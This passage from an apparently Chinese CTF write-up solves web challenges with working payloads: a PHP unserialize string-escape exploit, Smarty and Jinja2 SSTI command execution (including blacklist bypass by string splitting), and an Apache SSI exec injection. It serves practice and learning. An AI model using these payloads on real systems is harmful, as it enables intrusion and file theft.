class="hljs-variable">$config</span>);<br><br></code></pre></td></tr></table></figure><p>要点：</p><ul><li>filter函数</li></ul><p>经过审计 数据库中存在 username,password,profile字段</p><p>config.php 数据库配置</p><p>update.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;class.php&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] == <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Login First&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;phone&#x27;</span>] &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>] &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>] &amp;&amp; <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;photo&#x27;</span>]) &#123;<br><br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;phone&#x27;</span>]))<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid phone&#x27;</span>);<br><br><span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>]))<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid email&#x27;</span>);<br><br><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>]) || strlen(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>]) &gt; <span class="hljs-number">10</span>)<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid nickname&#x27;</span>);<br><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;photo&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;size&#x27;</span>] &lt; <span class="hljs-number">5</span> <span class="hljs-keyword">or</span> <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;size&#x27;</span>] &gt; <span class="hljs-number">1000000</span>)<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Photo size error&#x27;</span>);<br><br>move_uploaded_file(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-string">&#x27;upload/&#x27;</span> . md5(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>]));<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;phone&#x27;</span>] = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;phone&#x27;</span>];<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;email&#x27;</span>] = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>];<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>] = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>];<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;photo&#x27;</span>] = <span class="hljs-string">&#x27;upload/&#x27;</span> . md5(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>]);<br><br><span class="hljs-variable">$user</span>-&gt;update_profile(<span class="hljs-variable">$username</span>, serialize(<span class="hljs-variable">$profile</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br></code></pre></td></tr></table></figure><p>资料上传之后序列化被存入到数据库</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;phone&#x27;</span>]))<br>...<br><span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>]))<br>    ...    <br><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>]) || strlen(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>]) &gt; <span class="hljs-number">10</span>)<br></code></pre></td></tr></table></figure><div class="code-wrapper"><pre><code class="hljs">前两个if只要只要非1就执行语句块，最后一个只要为1就执行语句块，这里实际上我们不希望不符合条件。最后一个的if在于只要我们传入一个数组。程序返回false，就永远不会执行到对应的语句块中。</code></pre></div><p>梳理一下做题的流程：</p><p>注册用户 &#x3D;&gt; 登录 &#x3D;&gt; 完善信息(update.php修改nickname为数组，将恶意信息存入数据库) &#x3D;&gt; 资料页(profile.php触发unserliaze)</p><h3 id="构建exp-amp-getFlag"><a href="#构建exp-amp-getFlag" class="headerlink" title="构建exp&amp;getFlag"></a>构建exp&amp;getFlag</h3><p>根据前置知识，我们可以创建入如下脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;phone&#x27;</span>] =<span class="hljs-string">&#x27;11111111111&#x27;</span>;<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;email&#x27;</span>] = <span class="hljs-string">&#x27;132131232@qq.com&#x27;</span>;<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>] = <span class="hljs-keyword">array</span>(<span class="hljs-number">132131</span>);<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;photo&#x27;</span>] = <span class="hljs-string">&#x27;upload/&#x27;</span> . md5(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>]);<br><br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$profile</span>);<br><span class="hljs-comment">//原始  $profile[&#x27;nickname&#x27;] = &#x27;132131&#x27;;</span><br><span class="hljs-comment">//a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;11111111111&quot;;s:5:&quot;email&quot;;s:16:&quot;132131232@qq.com&quot;;s:8:&quot;nickname&quot;;s:6:&quot;132131&quot;;s:5:&quot;photo&quot;;s:39:&quot;upload/d41d8cd98f00b204e9800998ecf8427e&quot;;&#125;</span><br><span class="hljs-comment">//nickname=&gt; array(132131)</span><br><span class="hljs-comment">//a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;11111111111&quot;;s:5:&quot;email&quot;;s:16:&quot;132131232@qq.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;i:132131;&#125;s:5:&quot;photo&quot;;s:39:&quot;upload/d41d8cd98f00b204e9800998ecf8427e&quot;;&#125;</span><br><span class="hljs-comment">//目的</span><br><span class="hljs-comment">//a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;11111111111&quot;;s:5:&quot;email&quot;;s:16:&quot;132131232@qq.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;i:132131;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;s:39:&quot;upload/d41d8cd98f00b204e9800998ecf8427e&quot;;&#125;</span><br><span class="hljs-comment">//需要逃逸的字符串 &quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125; 长度34</span><br><span class="hljs-comment">//因为过滤后长度+1 约等于 5n+34=6n =&gt; n=34</span><br><span class="hljs-comment">//最后</span><br><span class="hljs-comment">//wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span><br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>然后在update.php处构造</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs http">...<br><span class="hljs-attribute">Content-Disposition</span><span class="hljs-punctuation">: </span>form-data; name=&quot;nickname[]&quot;<br><br>wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;<br>------WebKitFormBoundaryPDanrsn88DB96mAg<br><span class="hljs-attribute">Content-Disposition</span><span class="hljs-punctuation">: </span>form-data; name=&quot;photo&quot;; filename=&quot;Terminal.png&quot;<br><br></code></pre></td></tr></table></figure><p>之后转profile.php将Base64的内容解码即可得到flag</p><h2 id="CISCN2019-华东南赛区-Web11"><a href="#CISCN2019-华东南赛区-Web11" class="headerlink" title="[CISCN2019 华东南赛区]Web11"></a>[CISCN2019 华东南赛区]Web11</h2><p>没做出来这个一开始啥也没看出来hhh但是看wp很简单，xff就是ssti注入点如图 </p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201182242811.png" alt="image-20220118224240672"></p><p>发现是smarty框架</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201182245199.png" alt="image-20220118224517107"></p><p>最终payload</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">X-Forwarded-For:&#123;system(&#x27;cat ../../../../../../../../flag&#x27;)&#125;<br></code></pre></td></tr></table></figure><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201182245812.png" alt="image-20220118224539653"></p><h2 id="BSidesCF-2019-Futurella"><a href="#BSidesCF-2019-Futurella" class="headerlink" title="[BSidesCF 2019]Futurella"></a>[BSidesCF 2019]Futurella</h2><p>看源码得flag，是不是出题人没把编码问题搞好？</p><h2 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h2><p>一眼没思路就去找有没有泄露，果然index.php.swp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>ob_start();<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_hash</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable">$chars</span> = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;</span>;<br><span class="hljs-variable">$random</span> = <span class="hljs-variable">$chars</span>[mt_rand(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[mt_rand(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[mt_rand(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[mt_rand(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[mt_rand(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)];<span class="hljs-comment">//Random 5 times</span><br><span class="hljs-variable">$content</span> = uniqid().<span class="hljs-variable">$random</span>;<br><span class="hljs-keyword">return</span> sha1(<span class="hljs-variable">$content</span>); <br>&#125;<br>    header(<span class="hljs-string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);<br>***<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>] != <span class="hljs-string">&#x27;&#x27;</span> )<br>    &#123;<br>        <span class="hljs-variable">$admin</span> = <span class="hljs-string">&#x27;6d0bc1&#x27;</span>;<br>        <span class="hljs-keyword">if</span> ( <span class="hljs-variable">$admin</span> == substr(md5(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]),<span class="hljs-number">0</span>,<span class="hljs-number">6</span>)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;</span>;<br>            <span class="hljs-variable">$file_shtml</span> = <span class="hljs-string">&quot;public/&quot;</span>.get_hash().<span class="hljs-string">&quot;.shtml&quot;</span>;<br>            <span class="hljs-variable">$shtml</span> = fopen(<span class="hljs-variable">$file_shtml</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Unable to open file!&quot;</span>);<br>            <span class="hljs-variable">$text</span> = <span class="hljs-string">&#x27;</span><br><span class="hljs-string">            ***</span><br><span class="hljs-string">            ***</span><br><span class="hljs-string">            &lt;h1&gt;Hello,&#x27;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>].<span class="hljs-string">&#x27;&lt;/h1&gt;</span><br><span class="hljs-string">            ***</span><br><span class="hljs-string">***&#x27;</span>;<br>            fwrite(<span class="hljs-variable">$shtml</span>,<span class="hljs-variable">$text</span>);<br>            fclose(<span class="hljs-variable">$shtml</span>);<br>            ***<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[!] Header  error ...&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;</span>;<br>            <br>    &#125;<span class="hljs-keyword">else</span><br>    &#123;<br>***<br>    &#125;<br>***<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>意思让咱们写个脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000000000</span>):<br>    a = hashlib.md5(<span class="hljs-built_in">str</span>(i).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).hexdigest()<br>    <span class="hljs-keyword">if</span> a[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>] == <span class="hljs-string">&#x27;6d0bc1&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(i)<br>        <span class="hljs-built_in">print</span>(a)<br></code></pre></td></tr></table></figure><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201182255896.png" alt="image-20220118225546700"></p><p>将上面的脚本跑一下，拿里面的结果传参 发现一个新的地址</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201182256619.png" alt="image-20220118225650443"></p><p>继续直接传参我是直接复制的地址 然而 hello后面自动跟了 2020666 这是否意味着这里存在 模板+渲染的逻辑？</p><p>然后我尝试了ssti没成…继续看wp，这里存在一个apache的洞</p><p>利用方式</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--#exec cmd=&quot;whoami&quot; --&gt;</span><br></code></pre></td></tr></table></figure><p>继续在username哪里传参 不过要重新回到index.php</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201182300035.png" alt="image-20220118230050846"></p><p>之后访问对应的shtml即可得到对应的结果</p><p>然后就是一步步命令执行了这里执行不了find命令 &#x2F;var&#x2F;www&#x2F;html&#x2F;public 这是网站的工作目录</p><p>flag在 &#x2F;var&#x2F;www&#x2F;html 下</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201182306569.png" alt="image-20220118230615331"></p><h2 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h2><p>哇，一次加密，一次解密，很难受</p><p>使用这段代码读取源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;% <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="hljs-keyword">if</span> c.__name__==<span class="hljs-string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;app.py&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;<br></code></pre></td></tr></table></figure><p>hh 弱智了，为什么不能把字典先base64加密一遍。非要用它的加密模块，我是弱智…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,render_template_string<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> render_template,request,flash,redirect,url_for<br><span class="hljs-keyword">from</span> flask_wtf <span class="hljs-keyword">import</span> FlaskForm<br><span class="hljs-keyword">from</span> wtforms <span class="hljs-keyword">import</span> StringField, SubmitField<br><span class="hljs-keyword">from</span> wtforms.validators <span class="hljs-keyword">import</span> DataRequired<br><span class="hljs-keyword">from</span> flask_bootstrap <span class="hljs-keyword">import</span> Bootstrap<br><span class="hljs-keyword">import</span> base64<br> <br>app = Flask(__name__)<br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = <span class="hljs-string">&#x27;s_e_c_r_e_t_k_e_y&#x27;</span><br>bootstrap = Bootstrap(app)<br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NameForm</span>(<span class="hljs-params">FlaskForm</span>):</span><br>    text = StringField(<span class="hljs-string">&#x27;BASE64加密&#x27;</span>,validators= [DataRequired()])<br>    submit = SubmitField(<span class="hljs-string">&#x27;提交&#x27;</span>)<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NameForm1</span>(<span class="hljs-params">FlaskForm</span>):</span><br>    text = StringField(<span class="hljs-string">&#x27;BASE64解密&#x27;</span>,validators= [DataRequired()])<br>    submit = SubmitField(<span class="hljs-string">&#x27;提交&#x27;</span>)<br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):</span><br>    black_list = [<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;os&quot;</span>,<span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-string">&quot;popen&quot;</span>,<span class="hljs-string">&quot;import&quot;</span>,<span class="hljs-string">&quot;eval&quot;</span>,<span class="hljs-string">&quot;chr&quot;</span>,<span class="hljs-string">&quot;request&quot;</span>,<br>                  <span class="hljs-string">&quot;subprocess&quot;</span>,<span class="hljs-string">&quot;commands&quot;</span>,<span class="hljs-string">&quot;socket&quot;</span>,<span class="hljs-string">&quot;hex&quot;</span>,<span class="hljs-string">&quot;base64&quot;</span>,<span class="hljs-string">&quot;*&quot;</span>,<span class="hljs-string">&quot;?&quot;</span>]<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> black_list :<br>        <span class="hljs-keyword">if</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>.lower() :<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br> <br> <br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/hint&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hint</span>():</span><br>    txt = <span class="hljs-string">&quot;失败乃成功之母！！&quot;</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;hint.html&quot;</span>,txt = txt)<br> <br> <br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>,methods=[<span class="hljs-string">&#x27;POST&#x27;</span>,<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encode</span>():</span><br>    <span class="hljs-keyword">if</span> request.values.get(<span class="hljs-string">&#x27;text&#x27;</span>) :<br>        text = request.values.get(<span class="hljs-string">&quot;text&quot;</span>)<br>        text_decode = base64.b64encode(text.encode())<br>        tmp = <span class="hljs-string">&quot;结果  :&#123;0&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">str</span>(text_decode.decode()))<br>        res =  render_template_string(tmp)<br>        flash(tmp)<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;encode&#x27;</span>))<br> <br>    <span class="hljs-keyword">else</span> :<br>        text = <span class="hljs-string">&quot;&quot;</span><br>        form = NameForm(text)<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>,form = form ,method = <span class="hljs-string">&quot;加密&quot;</span> ,img = <span class="hljs-string">&quot;flask.png&quot;</span>)<br> <br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/decode&#x27;</span>,methods=[<span class="hljs-string">&#x27;POST&#x27;</span>,<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decode</span>():</span><br>    <span class="hljs-keyword">if</span> request.values.get(<span class="hljs-string">&#x27;text&#x27;</span>) :<br>        text = request.values.get(<span class="hljs-string">&quot;text&quot;</span>)<br>        text_decode = base64.b64decode(text.encode())<br>        tmp = <span class="hljs-string">&quot;结果 ： &#123;0&#125;&quot;</span>.<span class="hljs-built_in">format</span>(text_decode.decode())<br>        <span class="hljs-keyword">if</span> waf(tmp) :<br>            flash(<span class="hljs-string">&quot;no no no !!&quot;</span>)<br>            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;decode&#x27;</span>))<br>        res =  render_template_string(tmp)<br>        flash( res )<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;decode&#x27;</span>))<br> <br>    <span class="hljs-keyword">else</span> :<br>        text = <span class="hljs-string">&quot;&quot;</span><br>        form = NameForm1(text)<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>,form = form, method = <span class="hljs-string">&quot;解密&quot;</span> , img = <span class="hljs-string">&quot;flask1.png&quot;</span>)<br> <br> <br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&lt;name&gt;&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">not_found</span>(<span class="hljs-params">name</span>):</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;404.html&quot;</span>,name = name)<br> <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>, port=<span class="hljs-number">5000</span>, debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p>这里过滤的是单词所以很明显我们可以通过拼接的方式</p><p>然后</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;% <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="hljs-keyword">if</span> c.__name__==<span class="hljs-string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;__imp&#x27;</span>+<span class="hljs-string">&#x27;ort__&#x27;</span>](<span class="hljs-string">&#x27;o&#x27;</span>+<span class="hljs-string">&#x27;s&#x27;</span>).listdir(<span class="hljs-string">&#x27;/&#x27;</span>)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;<br></code></pre></td></tr></table></figure><p>得到 flag 在 &#x2F;this_is_the_flag.txt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;% <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% 